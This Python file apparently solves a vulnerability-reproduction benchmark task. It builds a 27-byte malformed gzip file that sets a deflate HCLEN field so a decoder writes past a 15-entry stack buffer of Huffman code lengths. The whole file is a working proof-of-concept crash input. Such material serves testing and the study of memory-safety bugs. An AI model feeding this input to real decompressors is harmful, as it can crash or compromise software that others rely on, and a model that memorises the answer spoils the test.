import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # GZIP Header: ID1(1f) ID2(8b) CM(08) FLG(00) MTIME(00000000) XFL(00) OS(00)
        # 10 bytes
        header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x00'
        
        # Deflate Payload (9 bytes)
        # We target a stack buffer overflow in the code length decoding.
        # The vulnerable buffer is size 15, but we can specify up to 19 code lengths.
        # We define a Dynamic Huffman block (BTYPE=2) with HCLEN=15 (max value).
        # HCLEN=15 means 15 + 4 = 19 code length codes.
        # We provide enough zero bits to populate these lengths.
        #
        # Bitstream construction (LSB first):
        # 1 bit: BFINAL = 1
        # 2 bits: BTYPE = 2 (10 binary -> 0, 1)
        # 5 bits: HLIT = 0 (00000)
        # 5 bits: HDIST = 0 (00000)
        # 4 bits: HCLEN = 15 (1111)
        # ... followed by 3-bit code lengths (all 0)
        #
        # Byte 0: 00000(HLIT) 1(BTYPE hi) 0(BTYPE lo) 1(BFINAL) -> 00000101 = 0x05
        # Byte 1: 111(HCLEN lo) 00000(HDIST) -> 11100000 = 0xE0
        # Byte 2: ... 000 000 1(HCLEN hi) -> 00000001 = 0x01
        # Remaining bytes: 0x00
        #
        # Payload size analysis:
        # 9 bytes = 72 bits.
        # Header fields use 1 + 2 + 5 + 5 + 4 = 17 bits.
        # Remaining 55 bits for code lengths.
        # 55 bits / 3 bits per code = 18.33 codes.
        # This allows writing 18 full codes (indices 0 to 17).
        # The buffer is size 15 (indices 0 to 14).
        # Writing to indices 15, 16, 17 causes the stack overflow.
        payload = b'\x05\xe0\x01\x00\x00\x00\x00\x00\x00'
        
        # Footer: CRC32 (4 bytes) + ISIZE (4 bytes)
        # 8 bytes of zeros
        footer = b'\x00' * 8
        
        # Total length: 10 + 9 + 8 = 27 bytes
        return header + payload + footer